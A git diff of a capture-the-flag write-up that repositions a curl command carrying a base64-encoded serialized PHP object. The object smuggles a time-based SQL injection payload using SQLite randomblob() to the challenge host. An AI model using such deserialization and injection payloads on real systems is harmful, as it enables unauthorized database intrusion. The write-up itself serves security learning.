@@ -49,14 +49,15 @@ Now we can create class and try to inject SQL payload like: `0XMohomiester'); se
 
 Note: The SQLite `randomblob()` function returns a blob containing pseudo-random bytes. The number of bytes is determined by its argument.
 
-```
-time curl -XGET https://a0351f3d2e04038e.247ctf.com/ -b '247=TzoxMDoiaW5zZXJ0X2xvZyI6MTp7czo4OiJuZXdfZGF0YSI7czo1MjoiMFhNb2hvbWllc3RlcicpOyBzZWxlY3QgMSA9IHJhbmRvbWJsb2IoOTk5OTk5OTk5KTstLSI7fQ==.0e'
-```
 
-![IMG5](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/997e9a8a-78c3-459f-907b-baa0425e02f1)
+![IMG5](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/3132b08b-bd51-4666-bc5e-08125625a523)
 
 
 Let's try it :
+
+```
+time curl -XGET https://a0351f3d2e04038e.247ctf.com/ -b '247=TzoxMDoiaW5zZXJ0X2xvZyI6MTp7czo4OiJuZXdfZGF0YSI7czo1MjoiMFhNb2hvbWllc3RlcicpOyBzZWxlY3QgMSA9IHJhbmRvbWJsb2IoOTk5OTk5OTk5KTstLSI7fQ==.0e'
+```
 
 ![IMG6](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/645e72aa-4228-4a34-be67-ec1b684e9ac3)
 
